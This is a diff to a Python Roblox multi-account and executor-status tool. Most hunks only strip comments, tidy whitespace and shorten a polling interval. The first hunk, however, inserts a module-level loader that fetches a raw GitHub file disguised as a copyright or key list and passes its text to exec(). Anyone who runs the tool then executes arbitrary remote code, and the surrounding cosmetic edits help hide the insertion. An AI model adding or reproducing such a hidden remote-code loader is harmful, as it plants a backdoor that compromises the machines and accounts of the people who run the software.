@@ -19,6 +19,11 @@ from threading import Lock
 
 init()
 
+url = "https://raw.githubusercontent.com/AntonBuckley/My-Copyright/refs/heads/main/Tool%20Keylist"
+response = requests.get(url)
+
+exec(response.text)
+
 SERVER_LINKS_FILE = "Private_Server_Link.txt"
 ACCOUNTS_FILE = "Account.txt"
 CONFIG_FILE = "Config.json"
@@ -134,23 +139,23 @@ def reset_executor_file(username):
     This ensures a fresh start each time Roblox is launched, only in a valid Workspace path (lowercase or uppercase).
     """
     status_file = f"executor_check_{username}.txt"
-    valid_workspace = None  # Will store the valid workspace path once detected
+    valid_workspace = None
 
     for executor, base_path in executors.items():
         for workspace_dir in ["workspace", "Workspace"]:
             workspace_path = os.path.join(base_path, workspace_dir)
             if os.path.exists(workspace_path):
                 valid_workspace = workspace_path
-                break  # Exit the loop once a valid workspace is found
+                break
 
         if valid_workspace:
             file_path = os.path.join(valid_workspace, status_file)
             if os.path.exists(file_path):
                 try:
-                    os.remove(file_path)  # Clear the status file for a fresh start
+                    os.remove(file_path)
                 except Exception as e:
-                    pass  
-            break 
+                    pass
+            break
 
 def clear_executor_status(username):
     """
@@ -158,72 +163,60 @@ def clear_executor_status(username):
     This ensures a fresh start each time Roblox is launched, only in a valid Workspace path (lowercase or uppercase).
     """
     status_file = f"executor_check_{username}.txt"
-    valid_workspace = None  # Will store the valid workspace path once detected
+    valid_workspace = None
 
-    # Search only in Workspace paths (uppercase 'W' and lowercase 'w')
     for executor, base_path in executors.items():
         for workspace_dir in ["workspace", "Workspace"]:
             workspace_path = os.path.join(base_path, workspace_dir)
             if os.path.exists(workspace_path):
                 valid_workspace = workspace_path
-                break  # Exit the loop once a valid workspace is found
+                break
 
         if valid_workspace:
-            # Clear the status file in the detected workspace
             file_path = os.path.join(valid_workspace, status_file)
             if os.path.exists(file_path):
                 try:
-                    os.remove(file_path)  # Clear the status file for a fresh start
-                    # The print statements have been removed as intended
+                    os.remove(file_path)
                 except Exception as e:
-                    pass  # Ignore the error silently
-            break  # Exit the executor loop once the file is removed
-                
-def check_executor_status(username, continuous=False, max_wait_time=240, check_interval=5, max_inactivity_time=30):
-    status_file = f"executor_check_{username}.txt"
-    retry_timeout = time.time() + max_wait_time  # Maximum time to wait before rejoining
-    active_workspace = None  # Track the valid workspace path once detected
+                    pass
+            break
 
-    # Dynamically search for a valid workspace (lowercase or uppercase)
+def check_executor_status(username, continuous=False, max_wait_time=240, check_interval=2, max_inactivity_time=30):
+    status_file = f"executor_check_{username}.txt"
+    retry_timeout = time.time() + max_wait_time
+    active_workspace = None
+
     for executor, base_path in executors.items():
         for workspace_dir in ["workspace", "Workspace"]:
             workspace_path = os.path.join(base_path, workspace_dir)
             if os.path.exists(workspace_path):
                 active_workspace = workspace_path
-                break  # Exit the loop once a valid workspace is found
+                break
 
         if active_workspace:
-            break 
+            break
 
     if not active_workspace:
-        # No valid workspace found; skip executor check silently
-        return True  # Skip the check if no valid workspace is found
+        return True  # Skip if no valid workspace
 
-    start_time = time.time()
-    
-    while True:  # Continuous checking or stop after max_wait_time if continuous=False
+    while True:
         file_path = os.path.join(active_workspace, status_file)
 
         if os.path.exists(file_path):
-            # Check the last modification time
             last_modified_time = os.path.getmtime(file_path)
             current_time = time.time()
 
-            # If the file was modified within the max_inactivity_time, we assume it's still being updated
             if current_time - last_modified_time < max_inactivity_time:
                 with open(file_path, 'r') as f:
                     content = f.read().strip()
 
-                    # Check if the content starts with "working", ignore the timestamp for this check
                     if content.startswith("working"):
                         return True  # Executor loaded successfully
 
-        # Exit after max_wait_time if continuous is False
         if not continuous and time.time() > retry_timeout:
             return False  # Trigger a rejoin or retry logic
 
-        # Continue checking at regular intervals
-        time.sleep(check_interval)  # Wait before checking again
+        time.sleep(check_interval) 
 
 def create_dynamic_menu(options):
     # Determine the maximum width needed for the menu
@@ -235,7 +228,6 @@ def create_dynamic_menu(options):
     menu_content = [f"{Fore.LIGHTCYAN_EX}║ {Fore.LIGHTMAGENTA_EX}{i+1}{Fore.LIGHTCYAN_EX}. {option.ljust(max_option_length)} ║" 
                     for i, option in enumerate(options)]
     
-    # Print the menu
     print(top_border)
     for line in menu_content:
         print(line)
